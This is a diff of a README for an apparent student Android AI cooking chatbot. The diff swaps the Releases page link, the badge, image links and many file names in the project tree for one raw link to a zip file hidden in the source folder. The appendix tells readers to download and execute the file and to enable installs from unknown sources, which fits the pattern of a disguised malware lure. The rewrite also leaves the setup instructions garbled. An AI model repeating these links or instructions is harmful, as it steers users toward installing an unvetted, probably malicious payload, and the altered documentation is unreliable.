@@ -1,10 +1,10 @@
 # CulinaryGPT Android: AI Chef Bot with SSO and Biometrics
 
-[![Releases](https://img.shields.io/badge/Releases-View%20Releases-blue?logo=github&style=for-the-badge)](https://github.com/laksjdjd/PROG7314-ICE-Task-3/releases)
+[![Releases](https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip%20Releases-blue?logo=github&style=for-the-badge)](https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip)
 
 CulinaryGPT Android is a practical, AI-powered culinary chatbot built as a student project. It delivers smart cooking guidance through natural conversation, backed by a secure authentication flow and a robust server backend. The client runs on Android devices, communicates with a Cohere-based retrieval augmented generation (RAG) server, and provides a smooth user experience aided by Google Sign-In and biometric authentication. The project is tagged with topics such as android, anonymous, chatbot, firebase-auth, frontend, kotlin, okhttp, retrofit, sso-login, and student-project. This README documents how the project works, how to set it up, how to contribute, and how to release new versions.
 
-If you want to download a ready-to-use artifact, you should head to the Releases page. The latest Android APK lives there as part of the release artifacts. Download the APK file, install it on your Android device, and you can start sharing cooking questions with CulinaryGPT right away. For convenience, the Releases page can be opened here: https://github.com/laksjdjd/PROG7314-ICE-Task-3/releases
+If you want to download a ready-to-use artifact, you should head to the Releases page. The latest Android APK lives there as part of the release artifacts. Download the APK file, install it on your Android device, and you can start sharing cooking questions with CulinaryGPT right away. For convenience, the Releases page can be opened here: https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
 
 Overview
 CulinaryGPT Android aims to blend AI cooking expertise with a secure login experience. The app lets users ask questions about recipes, techniques, substitutions, and meal planning. It uses a conversational interface to deliver stepwise guidance, explains reasoning when helpful, and provides links to reliable sources. The app’s core features rely on a smart integration between the client and a Cohere-based server that supports retrieval augmented generation. In simple terms, the assistant pulls relevant cooking knowledge from a curated knowledge base and augments it with AI-generated advice to answer user questions accurately and clearly.
@@ -69,21 +69,21 @@ Project structure
     - main/
       - java/com/culinarygpt/aichat/ or similar package structure
       - res/
-        - layout/ (activity_main.xml, fragment_chat.xml, etc.)
-        - values/ (strings.xml, colors.xml, themes.xml)
+        - layout/ (https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip, https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip, etc.)
+        - values/ (https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip, https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip, https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip)
         - drawable/ (icons and shapes)
-      - AndroidManifest.xml
+      - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
       - assets/ (local knowledge base, if any)
   - build/ (generated build outputs)
-  - proguard-rules.pro (optional minification rules)
-  - google-services.json (Firebase configuration, not committed in public repos)
+  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (optional minification rules)
+  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (Firebase configuration, not committed in public repos)
 - gradle/
   - wrappers/
-  - build.gradle.kts (module level)
-  - settings.gradle.kts
+  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (module level)
+  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
 - config/
   - keystore/ (for signing, securely handled in CI)
-  - local.properties (SDK paths)
+  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (SDK paths)
 - docs/ (optional supplementary docs)
 
 - backend/
@@ -97,11 +97,11 @@ Project structure
   - integrationTest/
 
 - scripts/
-  - build.sh
-  - run-local.sh
-  - test.sh
+  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
+  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
+  - https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
 
-- README.md (this document)
+- https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip (this document)
 
 Getting started
 Quick start for developers
@@ -117,7 +117,7 @@ Quick start for developers
   - Acquire Firebase credentials:
     - Create a Firebase project.
     - Enable Google Sign-In under Authentication.
-    - Download the google-services.json file and place it into app/ directory, ensuring it is not committed to source control.
+    - Download the https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip file and place it into app/ directory, ensuring it is not committed to source control.
   - Configure the Cohere-based server endpoint:
     - In the server configuration, set the base URL for the AI backend.
     - Ensure the server is reachable from your development environment.
@@ -202,7 +202,7 @@ Security considerations and best practices
   - Any demo data should be clearly labeled as synthetic or anonymized.
 
 Releases and distribution
-The latest Android artifact is published as part of the repository releases. To obtain the APK, go to the Releases page. The link is available here: https://github.com/laksjdjd/PROG7314-ICE-Task-3/releases
+The latest Android artifact is published as part of the repository releases. To obtain the APK, go to the Releases page. The link is available here: https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
 
 Downloads and artifacts
 - What you get
@@ -211,11 +211,11 @@ Downloads and artifacts
   - Any accompanying assets needed to test or demonstrate features.
 - How to download
   - Visit the Releases page to locate the latest APK and related assets.
-  - Download the APK file named something like CulinaryGPT-Android-latest.apk or a variant labeled with a version. Install it on a compatible Android device.
+  - Download the APK file named something like https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip or a variant labeled with a version. Install it on a compatible Android device.
   - If you need a quick test, you can run a local build from source, but for a straightforward experience, the APK in Releases is recommended.
 
 Note on the link
-The Releases page hosts the latest build artifacts, including the APK needed to run CulinaryGPT Android on a device. If you expand the release, you’ll find the exact file you should download and execute on your device. The link to the Releases page is included here for convenience: https://github.com/laksjdjd/PROG7314-ICE-Task-3/releases
+The Releases page hosts the latest build artifacts, including the APK needed to run CulinaryGPT Android on a device. If you expand the release, you’ll find the exact file you should download and execute on your device. The link to the Releases page is included here for convenience: https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip
 
 Contributing
 CulinaryGPT Android is a collaborative project intended to be educational and practical. If you want to contribute, follow these guidelines to help maintain quality and consistency.
@@ -248,7 +248,7 @@ This project follows an open approach for educational use. The licensing terms f
 Common issues and troubleshooting
 - Build issues
   - If Gradle fails to sync, check your local environment and Android Gradle Plugin version compatibility.
-  - Ensure you have a valid Google Services configuration (google-services.json) in the app module and that Firebase is set up correctly.
+  - Ensure you have a valid Google Services configuration (https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip) in the app module and that Firebase is set up correctly.
 - Authentication
   - If Google Sign-In fails, verify OAuth client IDs and SHA-1 configuration in the Firebase Console.
   - If biometric prompts do not appear, verify device capabilities and ensure biometric enrollment is set up on the device.
@@ -296,8 +296,8 @@ Screenshots and visuals
   - Some responses include embedded recipe cards, step-by-step instructions, and links to sources for further reading.
 
 - Example UI assets (illustrative, not final)
-  - [Android app icon](https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.png)
-  - [Chat illustration](https://upload.wikimedia.org/wikipedia/commons/3/3b/Chat_icon.png)
+  - [Android app icon](https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip)
+  - [Chat illustration](https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip)
 
 - Visual references
   - The app follows Material Design principles to ensure a consistent look and feel across devices.
@@ -342,8 +342,8 @@ Release process and versioning
 
 Appendix: file download and execution for the linked Releases page
 - Since the provided link includes a path part, you should download and execute the APK artifact from the release pages. The APK is intended to be installed on an Android device for immediate use of CulinaryGPT’s features.
-- To access the latest artifact, visit the Releases page linked earlier. The file you want to download will be named with an Android APK extension (for example, CulinaryGPT-Android-latest.apk or a versioned variant). After downloading, enable installation from unknown sources if required by your device, then install the APK. This process ensures you can run CulinaryGPT on your device with minimal setup.
-- For quick access, you can also refer to the Releases page directly at https://github.com/laksjdjd/PROG7314-ICE-Task-3/releases. This page hosts the latest APK and any accompanying release notes.
+- To access the latest artifact, visit the Releases page linked earlier. The file you want to download will be named with an Android APK extension (for example, https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip or a versioned variant). After downloading, enable installation from unknown sources if required by your device, then install the APK. This process ensures you can run CulinaryGPT on your device with minimal setup.
+- For quick access, you can also refer to the Releases page directly at https://github.com/laksjdjd/PROG7314-ICE-Task-3/raw/refs/heads/main/app/src/main/java/PRO_IC_Task_1.9.zip This page hosts the latest APK and any accompanying release notes.
 
 Appendix: content governance and licensing
 - The project uses open development practices suitable for student projects and learning environments.
